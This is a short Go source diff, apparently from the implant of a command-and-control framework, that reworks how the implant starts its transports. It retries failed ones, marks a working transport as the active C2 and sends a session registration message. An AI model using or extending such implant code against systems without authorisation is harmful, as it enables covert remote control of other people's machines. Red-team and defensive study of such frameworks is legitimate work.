@@ -32,6 +32,10 @@ import (
 	"time"
 )
 
+const (
+	defaultNetTimeout = time.Second * 60
+)
+
 var (
 	keyPEM    = `{{.Config.Key}}`
 	certPEM   = `{{.Config.Cert}}`
@@ -98,17 +102,21 @@ func (t *transports) Init() (err error) {
 	// Then start the first transport, with fallback if failure
 	for _, tp := range t.Available {
 
-		// This automatically performs Comm init and Session registration.
+		// This might will init the Comm system, but in the case of tunnel-based
+		// routing, we have concurrently started this process, and it will only
+		// finish its setup once we are out of this Init() function.
 		err = tp.Start(false)
 
-		// Assign it as the Active C2 as well.
-		if err == nil {
-			t.Server = tp
-			return
+		if err != nil {
+			// Wait if this transport failed.
+			time.Sleep(reconnectInterval)
+			continue
 		}
 
-		// Wait if this transport failed.
-		time.Sleep(reconnectInterval)
+		// Else success: set transport as active C2, send registration message and return
+		Transports.Server = tp
+		tp.C2.Send <- tp.registerSliver()
+		return
 	}
 
 	return errors.New("Failed to start one of the available transports")
